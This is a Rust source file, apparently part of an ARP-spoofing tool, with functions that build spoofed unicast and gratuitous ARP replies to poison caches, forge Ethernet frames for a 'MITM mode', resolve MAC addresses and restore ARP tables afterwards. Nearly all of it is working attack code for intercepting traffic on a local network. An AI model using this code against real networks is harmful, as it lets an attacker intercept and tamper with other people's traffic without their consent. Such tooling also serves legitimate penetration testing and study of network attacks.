use anyhow::{anyhow, Result};
use pnet::datalink::{DataLinkReceiver, DataLinkSender};
use pnet::packet::arp::{
    ArpHardwareTypes, ArpOperation, ArpOperations, ArpPacket, MutableArpPacket,
};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::thread;
use std::time::Duration;

fn arp_frame(
    eth_dst: MacAddr,
    eth_src: MacAddr,
    op: ArpOperation,
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    let size =
        MutableEthernetPacket::minimum_packet_size() + MutableArpPacket::minimum_packet_size();
    let mut buf = vec![0u8; size];

    let mut eth = MutableEthernetPacket::new(&mut buf)?;
    eth.set_destination(eth_dst);
    eth.set_source(eth_src);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp_buf = vec![0u8; MutableArpPacket::minimum_packet_size()];
    let mut arp = MutableArpPacket::new(&mut arp_buf)?;
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(op);
    arp.set_sender_hw_addr(sender_mac);
    arp.set_sender_proto_addr(sender_ip);
    arp.set_target_hw_addr(target_mac);
    arp.set_target_proto_addr(target_ip);

    eth.set_payload(arp.packet());
    Some(buf)
}

/// Builds a spoofed unicast ARP reply to poison one device's ARP cache entry.
pub fn build_arp_reply(
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    arp_frame(
        target_mac,
        source_mac,
        ArpOperations::Reply,
        source_mac,
        source_ip,
        target_mac,
        target_ip,
    )
}

/// Builds a gratuitous ARP reply (broadcast ethernet, sender_ip == target_ip).
/// Every device that receives this will update its cache for `claimed_ip → source_mac`.
pub fn build_gratuitous_arp(source_mac: MacAddr, claimed_ip: Ipv4Addr) -> Option<Vec<u8>> {
    arp_frame(
        MacAddr::broadcast(),
        source_mac,
        ArpOperations::Reply,
        source_mac,
        claimed_ip,
        MacAddr::broadcast(),
        claimed_ip,
    )
}

/// Builds a broadcast ARP request to resolve `target_ip` to a MAC address.
pub fn build_arp_request(
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    arp_frame(
        MacAddr::broadcast(),
        source_mac,
        ArpOperations::Request,
        source_mac,
        source_ip,
        MacAddr::zero(),
        target_ip,
    )
}

/// Wraps a raw IP payload in an ethernet frame with the given src/dst MACs.
/// Used in MITM mode to send the attacker's traffic with a spoofed source identity.
pub fn build_raw_ip_frame(
    src_mac: MacAddr,
    dst_mac: MacAddr,
    ip_payload: &[u8],
) -> Option<Vec<u8>> {
    let size = MutableEthernetPacket::minimum_packet_size() + ip_payload.len();
    let mut buf = vec![0u8; size];

    let mut eth = MutableEthernetPacket::new(&mut buf)?;
    eth.set_source(src_mac);
    eth.set_destination(dst_mac);
    eth.set_ethertype(EtherTypes::Ipv4);
    eth.set_payload(ip_payload);

    Some(buf)
}

/// Sends an ARP request and waits for a reply, retrying up to 3 times.
/// Each attempt waits up to one channel read_timeout before retrying.
pub fn resolve_mac(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn DataLinkReceiver>,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Result<MacAddr> {
    const RETRIES: u32 = 3;

    for attempt in 0..RETRIES {
        let request = build_arp_request(target_ip, source_mac, source_ip)
            .ok_or_else(|| anyhow!("Failed to build ARP request packet"))?;

        if let Some(res) = tx.send_to(&request, None) {
            res.map_err(|e| anyhow!("Failed to send ARP request: {}", e))?;
        }

        loop {
            match rx.next() {
                Ok(packet) => {
                    if let Some(eth) = EthernetPacket::new(packet) {
                        if eth.get_ethertype() == EtherTypes::Arp {
                            if let Some(arp) = ArpPacket::new(eth.payload()) {
                                if arp.get_operation() == ArpOperations::Reply
                                    && arp.get_sender_proto_addr() == target_ip
                                {
                                    return Ok(arp.get_sender_hw_addr());
                                }
                            }
                        }
                    }
                }
                // read_timeout expired or I/O error — move to next attempt
                Err(_) => break,
            }
        }

        if attempt + 1 < RETRIES {
            eprintln!(
                "No ARP reply from {}, retrying ({}/{})...",
                target_ip,
                attempt + 1,
                RETRIES
            );
        }
    }

    Err(anyhow!(
        "No ARP reply from {} after {} attempts",
        target_ip, RETRIES
    ))
}

/// Sends the correct ARP mappings to each target and the gateway to undo poisoning.
/// Repeats 3 times with short delays for reliability.
pub fn restore_arp(
    tx: &mut Box<dyn DataLinkSender>,
    targets: &[(Ipv4Addr, MacAddr)],
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    debug: bool,
) {
    for _ in 0..3 {
        for &(target_ip, target_mac) in targets {
            if let Some(pkt) = build_arp_reply(target_mac, target_ip, gateway_mac, gateway_ip) {
                let _ = tx.send_to(&pkt, None);
                if debug {
                    println!("[R] → {}: {} is at {}", target_ip, gateway_ip, gateway_mac);
                }
            }
            if let Some(pkt) = build_arp_reply(gateway_mac, gateway_ip, target_mac, target_ip) {
                let _ = tx.send_to(&pkt, None);
                if debug {
                    println!("[R] → gateway: {} is at {}", target_ip, target_mac);
                }
            }
        }
        thread::sleep(Duration::from_millis(50));
    }
}
